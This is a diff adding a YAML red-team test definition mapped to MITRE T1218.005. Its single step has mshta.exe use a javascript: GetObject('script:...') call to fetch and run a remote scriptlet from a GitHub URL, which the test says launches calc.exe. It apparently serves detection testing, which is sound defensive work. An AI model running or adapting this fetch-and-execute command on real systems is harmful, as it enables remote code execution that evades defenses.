@@ -1,0 +1,27 @@
+api_version: "2.0"
+name: Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
+description: |
+    Test execution of a remote script using mshta.exe. Upon execution calc.exe will be launched.
+args:
+    - name: file_url
+      type: url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct
+uuid: 1483fab9-4f52-4217-a9ce-daa9d7747cae
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1218: System Binary Proxy Execution'
+    subtechniques:
+        - 'T1218.005: Mshta'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: mshta-executes-javascript-scheme-fetch-remote-payload-with-getobject
+      inline: |
+        mshta.exe javascript:a=(GetObject('script:{{.Args.file_url}}')).Exec();close();
+      executor: command_prompt
+      cleanup:
+        inline: ""
+        executor: command_prompt
